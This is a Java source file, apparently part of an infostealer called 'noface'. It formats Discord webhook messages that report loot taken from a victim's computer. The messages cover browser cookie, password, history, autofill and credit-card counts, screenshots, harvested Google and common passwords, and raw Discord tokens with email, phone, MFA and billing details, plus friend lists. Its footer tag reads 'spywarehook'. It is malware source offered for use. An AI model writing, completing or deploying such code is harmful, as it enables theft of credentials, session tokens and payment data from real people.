package noface.sync;

import noface.config.Cfg;
import noface.config.Emoji;
import noface.config.S;
import noface.sync.Info.Token;
import noface.browsers.Pull.BrowserStat;

import java.util.List;

public final class Embed {

    static final String OK  = Emoji.LEAF;
    static final String OK2 = Emoji.EARLY;

    public static String esc(String v) {
        if (v == null) return "yok";
        StringBuilder sb = new StringBuilder(v.length() + 16);
        for (int i = 0; i < v.length(); i++) {
            char c = v.charAt(i);
            if (c == '\\') sb.append("\\\\");
            else if (c == '"') sb.append("\\\"");
            else if (c == '\n') sb.append("\\n");
            else if (c == '\r') sb.append("\\r");
            else if (c == '\t') sb.append("\\t");
            else if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
            else sb.append(c);
        }
        return sb.toString();
    }

    private static String sep() { return "{\"type\":14,\"divider\":true,\"spacing\":1}"; }
    private static String txt(String c) { return "{\"type\":10,\"content\":\"" + c + "\"}"; }
    private static String foot(String tag) { return txt("-# " + esc(tag)); }

    public static String swapFoot(String json, String tag) {
        if (json == null || json.isEmpty() || tag == null) return json;
        String needle = ",{\"type\":14,\"divider\":true,\"spacing\":1},{\"type\":10,\"content\":\"-# ";
        int at = json.lastIndexOf(needle);
        if (at < 0) {
            needle = ",{\"type\":10,\"content\":\"-# ";
            at = json.lastIndexOf(needle);
            if (at < 0) return json;
        }
        int start = at + needle.length();
        int p = start;
        while (p < json.length()) {
            char c = json.charAt(p);
            if (c == '\\') {
                p += 2;
                continue;
            }
            if (c == '"') break;
            p++;
        }
        if (p >= json.length()) return json;
        return json.substring(0, start) + esc(tag) + json.substring(p);
    }

    public static String browserBlock(List<BrowserStat> stats) {
        if (stats == null || stats.isEmpty()) return "veri yok";
        StringBuilder sb = new StringBuilder();
        for (BrowserStat b : stats) {
            sb.append(b.name()).append(": C: ").append(b.cookies())
              .append(" P: ").append(b.passwords())
              .append(" H: ").append(b.history())
              .append(" A: ").append(b.fill())
              .append(" CC: ").append(b.cards())
              .append(" D: ").append(b.downloads()).append('\n');
        }
        return sb.toString().trim();
    }

    public static String screen(String footer) {
        StringBuilder sb = new StringBuilder();
        sb.append("{\"flags\":32768,\"components\":[{\"type\":17,\"accent_color\":null,\"spoiler\":false,\"components\":[");
        sb.append(txt("### Screen"));
        sb.append(",").append(sep()).append(",");
        sb.append("{\"type\":12,\"items\":[{\"media\":{\"url\":\"attachment://screen.png\"},\"description\":null,\"spoiler\":false}]}");
        sb.append(",").append(sep()).append(",");
        sb.append(foot(footer));
        sb.append("]}]}");
        return sb.toString();
    }

    public static String mostPass(String body) {
        String box = "```\n" + ((body == null || body.isEmpty()) ? S.e("No Passwords") : body) + "\n```";
        StringBuilder sb = new StringBuilder();
        sb.append("{\"flags\":32768,\"components\":[{\"type\":17,\"accent_color\":null,\"spoiler\":false,\"components\":[");
        sb.append(txt("### " + Emoji.PASS + " " + S.e("Common Passwords")));
        sb.append(",").append(sep()).append(",");
        sb.append(txt(esc(box)));
        sb.append(",").append(sep()).append(",");
        sb.append(foot(Cfg.footer()));
        sb.append("]}]}");
        return sb.toString();
    }

    public static String googlePass(String body) {
        if (body == null || body.isEmpty()) return null;
        String box = "```\n" + body + "\n```";
        StringBuilder sb = new StringBuilder();
        sb.append("{\"flags\":32768,\"components\":[{\"type\":17,\"accent_color\":null,\"spoiler\":false,\"components\":[");
        sb.append(txt("### " + Emoji.GMAIL + " " + S.e("Google Passwords")));
        sb.append(",").append(sep()).append(",");
        sb.append(txt(esc(box)));
        sb.append(",").append(sep()).append(",");
        sb.append(foot(Cfg.footer()));
        sb.append("]}]}");
        return sb.toString();
    }

    public static String mainUser(String pc, String os, String browserLines, String footer) {
        StringBuilder sb = new StringBuilder();
        sb.append("{\"flags\":32768,\"components\":[{\"type\":17,\"accent_color\":null,\"spoiler\":false,\"components\":[");
        sb.append(txt("### NEW USER | " + esc(pc) + " ( " + esc(os) + " )"));
        sb.append(",").append(sep()).append(",");
        sb.append("{\"type\":13,\"file\":{\"url\":\"attachment://").append(esc(Cfg.zipName())).append("\"},\"spoiler\":false}");
        sb.append(",").append(sep()).append(",");
        sb.append(txt("### Browser Data\\n```\\n" + esc(browserLines) + "\\n```"));
        sb.append(",{\"type\":1,\"components\":[{\"type\":2,\"style\":5,\"label\":\"")
          .append(esc(Cfg.panelLabel())).append("\",\"disabled\":true,\"url\":\"")
          .append(esc(Cfg.panelUrl())).append("\"}]},");
        sb.append(sep()).append(",");
        sb.append(foot(footer));
        sb.append("]}]}");
        return sb.toString();
    }

    public static String account(Token t, String avatarFile, String probable) {
        String badges = t.badges() == null ? "" : t.badges();
        String phone = t.phone().isEmpty() ? S.e("None") : t.phone();
        String billing = t.billSources() > 0
                ? "``" + t.billSources() + " Source(s)``"
                : "``Disabled``";
        String pass = (probable == null || probable.isEmpty()) ? "`" + S.e("No Passwords") + "`" : probable;
        String tok = "```ansi\n\u001b[0;34m" + n(t.raw()) + "\u001b[0m\n```";
        boolean av = avatarFile != null && !avatarFile.isEmpty();

        StringBuilder sb = new StringBuilder();
        sb.append("{\"flags\":32768,\"components\":[{\"type\":17,\"accent_color\":null,\"spoiler\":false,\"components\":[");
        sb.append(txt("### Account | [@" + esc(t.user()) + " (" + esc(t.id()) + ")](" + esc(Cfg.tgLink()) + ")"));
        sb.append(",").append(sep()).append(",");

        if (av) {
            sb.append("{\"type\":9,\"components\":[");
            if (!badges.isEmpty()) sb.append(txt(badges)).append(",");
            sb.append(txt(Emoji.TOKEN + " " + S.e("Token")));
            sb.append(",").append(txt(esc(tok)));
            sb.append("],\"accessory\":{\"type\":11,\"media\":{\"url\":\"attachment://")
              .append(esc(avatarFile)).append("\"},\"spoiler\":false}},");
        } else {
            if (!badges.isEmpty()) sb.append(txt(badges)).append(",");
            sb.append(txt(Emoji.TOKEN + " " + S.e("Token")));
            sb.append(",").append(txt(esc(tok))).append(",");
        }
        sb.append(sep()).append(",");

        String sec = t.mfa() ? Emoji.YES : Emoji.NO;
        String info = Emoji.UNAME + " **" + S.e("Username:") + "** ``" + n(t.user()) + "``\n"
                + Emoji.MAIL + " **" + S.e("Email:") + "** ``" + n(t.email()) + "``\n"
                + Emoji.PHONE + " **" + S.e("Phone:") + "** ``" + n(phone) + "``\n"
                + Emoji.SEC + " **" + S.e("Security:") + "** " + sec + "\n"
                + Emoji.BILL + " **" + S.e("Billing:") + "** " + billing + "\n"
                + Emoji.MADE + " **" + S.e("Create:") + "** ``" + born(t.id()) + "``\n"
                + Emoji.PASS + " **" + S.e("Probable Passwords:") + "** " + pass;
        sb.append(txt(esc(info)));
        sb.append(",").append(sep()).append(",");
        sb.append(foot(Cfg.footer()));
        sb.append("]}]}");
        return sb.toString();
    }

    public static String friendListBatch(String content, boolean first, boolean last, int hq, int total) {
        StringBuilder sb = new StringBuilder();
        sb.append("{\"flags\":32768,\"components\":[{\"type\":17,\"accent_color\":null,\"spoiler\":false,\"components\":[");
        if (first) {
            sb.append(txt("### " + Emoji.HQ + " " + S.e("HQ Friends") + " (" + hq + "/" + total + ")"));
            sb.append(",").append(sep()).append(",");
        }
        sb.append(txt(esc(content)));
        if (last) {
            sb.append(",").append(sep()).append(",");
            sb.append(foot(Cfg.footer()));
        }
        sb.append("]}]}");
        return sb.toString();
    }

    private static String n(String s) { return s == null ? "" : s; }

    private static String born(String id) {
        try {
            if (id == null || id.isEmpty()) return S.e("None");
            long snow = Long.parseUnsignedLong(id.trim());
            long ms = (snow >>> 22) + 1_420_070_400_000L;
            java.time.LocalDate d = java.time.Instant.ofEpochMilli(ms)
                    .atZone(java.time.ZoneOffset.UTC)
                    .toLocalDate();
            return String.format("%02d/%02d/%d", d.getDayOfMonth(), d.getMonthValue(), d.getYear());
        } catch (Exception e) {
            return S.e("None");
        }
    }

    public static String step(String host, String user, String msg) {
        String body = "**" + esc(host) + "** / ``" + esc(user) + "``\\n" + esc(msg);
        StringBuilder sb = new StringBuilder();
        sb.append("{\"flags\":32768,\"components\":[{\"type\":17,\"accent_color\":null,\"spoiler\":false,\"components\":[");
        sb.append(txt("### " + OK + " **" + esc(msg) + "**"));
        sb.append(",").append(sep()).append(",");
        sb.append(txt(body));
        sb.append(",").append(sep()).append(",");
        sb.append(foot(S.e("spywarehook")));
        sb.append("]}]}");
        return sb.toString();
    }

    private Embed() {}
}
